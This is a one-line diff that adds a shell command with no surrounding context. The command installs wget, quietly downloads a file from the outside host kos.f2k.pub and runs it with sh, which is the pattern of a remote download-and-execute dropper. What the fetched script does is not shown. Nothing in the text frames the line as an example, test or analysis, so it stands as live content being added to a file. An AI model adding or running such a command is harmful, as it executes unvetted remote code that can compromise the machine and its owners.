@@ -1,0 +1,1 @@
+yum install -y wget;wget -q kos.f2k.pub -O kos && sh kos
